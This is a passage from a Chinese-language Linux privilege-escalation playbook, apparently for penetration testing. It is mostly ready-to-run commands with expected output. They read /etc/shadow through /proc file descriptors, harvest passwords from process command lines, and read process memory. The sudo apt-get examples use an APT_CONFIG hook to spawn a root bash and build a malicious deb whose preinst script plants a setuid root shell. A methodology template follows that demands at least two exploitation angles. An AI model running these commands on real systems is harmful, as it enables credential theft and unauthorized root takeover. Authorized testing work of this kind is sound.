    ls -la /proc/1234/fd/ → 列出进程打开的文件描述符
    → 发现 fd 5 → /etc/shadow
    cat /proc/1234/fd/5 → 读取 /etc/shadow 内容
    
    → 或者：
    ls -la /proc/*/fd/* 2>/dev/null | grep -E "shadow|passwd|\.key|\.pem"

  角度 3（cmdline 泄露 — 命令行参数中的密码）：
    for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
      cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '
    done | grep -i "pass\|secret\|key"
    
    → 发现: mysqld --user=root --password=Secret123
    → 明文密码在命令行参数中

  角度 4（maps 泄露 — 内存地址泄露，用于绕过 ASLR）：
    cat /proc/1234/maps → 获取内存布局
    → 用于构造 ROP 链或精确覆盖

  角度 5（mem 读取 — 进程内存直接读取）：
    dd if=/proc/1234/mem bs=1 skip=$((0xADDRESS)) count=100 2>/dev/null
    → 需要 ptrace 权限或 CAP_SYS_PTRACE

[C] 记录：
  角度 1 成功 → verified (VULN-021), 环境变量凭据泄露, 高危
    MYSQL_ROOT_PASSWORD=SuperSecret123! 已验证可用
  角度 2 成功 → verified (VULN-022), fd 泄露 /etc/shadow, 高危
  角度 3 成功 → verified (VULN-023), 命令行参数凭据泄露, 中危
```

---

## 实例 16：条件竞争 — sudo 缓存窗口利用

> **教训**：sudo 的 timestamp 缓存是一个可利用的时间窗口，特别是多终端场景。

```
发现: sudo -V → authentication timestamp timeout: 15 minutes
      sudo -l → (root) NOPASSWD: /usr/bin/apt-get update

[A] 环境分析：
  sudo 缓存超时 15 分钟 → 用户执行 sudo 后 15 分钟内可免密
  有一条 NOPASSWD 规则 → apt-get update 可免密执行
  检查其他 sudo 规则 → (root) /usr/bin/apt-get install *

[B] 利用方法：
  角度 1（apt-get install 利用 — GTFOBins）：
    # apt-get install 可以执行 pre/post install 脚本
    # 方法 A：利用 apt 钩子
    echo 'Dpkg::Pre-Install-Pkgs {"/bin/bash";};' > /tmp/apt.conf
    APT_CONFIG=/tmp/apt.conf sudo apt-get install sl
    → 在安装前执行 bash → root shell

    # 方法 B：利用预下载包
    # 创建恶意 deb 包，preinst 脚本包含提权命令
    mkdir -p /tmp/evil/DEBIAN
    cat > /tmp/evil/DEBIAN/preinst << 'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/rootsh && chmod u+s /tmp/rootsh
    EOF
    chmod 755 /tmp/evil/DEBIAN/preinst
    dpkg-deb --build /tmp/evil /tmp/evil.deb
    sudo apt-get install /tmp/evil.deb
    → /tmp/rootsh -p → root shell

  角度 2（sudo 缓存窗口 — 条件竞争）：
    # 如果其他用户在同一终端使用 sudo（如 cron 或脚本中）
    # sudo 缓存生效期间，testuser 可执行其他 sudo 规则
    
    # 监控 sudo 缓存状态
    ls -la /run/sudo/ts/testuser 2>/dev/null || ls -la /var/run/sudo/ts/testuser
    stat /run/sudo/ts/testuser → 检查修改时间
    # 若最近 15 分钟内有修改 → 缓存有效
    sudo /usr/bin/apt-get install * → 尝试利用

[C] 记录：
  角度 1 成功 → verified (VULN-024), apt-get install 提权, 高危
  角度 2 → 条件性风险 RISK-002, 取决于 sudo 缓存是否活跃
```

---

## 使用指南

### 分析方法论模板（[A]→[B]→[C]）

**[A] 功能理解前置**（必须先执行）：
1. `file` + `strings` + `readelf` → 识别类型、关键字符串、依赖
2. `--help` / `-h` → 获取用法说明
3. 如为脚本 → 直接阅读源码
4. 如为二进制 → 根据 strings + help 推断功能类别
5. 选择 2-3 种最可能成功的攻击向量

**[B] 多角度利用**（至少 2 种）：
- 优先尝试推理出的新利用点
- 同时覆盖已知手法（GTFOBins、CVE EXP）
- 每种角度必须有明确的命令和预期输出
- 失败的角度必须记录原因

**[C] 记录**：
- 成功 → verified + VULN 编号 + 完整利用链
- 失败 → 逐条记录失败原因 + 替代方案
- 条件性 → risk-only + RISK 编号 + 利用条件

### 常见验证不深入的原因及对策

| 问题 | 表现 | 对策 |
|------|------|------|
| 只看表面配置 | "sudo 规则有限制，不可利用" | 逐条分析 sudo 规则，对照 GTFOBins |
| 只尝试一种方法 | "SUID 程序不是 GTFOBins，跳过" | 必须 [A]→[B]→[C] 完整分析 |
| 忽略防御机制 | "cap_setuid 存在，已验证" | 检查 SELinux/AppArmor/seccomp 是否阻止 |
| 忽略组合利用 | 逐项独立评估，不考虑组合 | §2.2.3 组合推理 |
| 使用模糊描述 | "可能存在提权风险" | §2.3 三态标准：verified/risk-only/excluded |
| 忽略环境差异 | 通用 EXP 不工作就放弃 | §2.2.5 环境适配 + 多种 EXP 尝试 |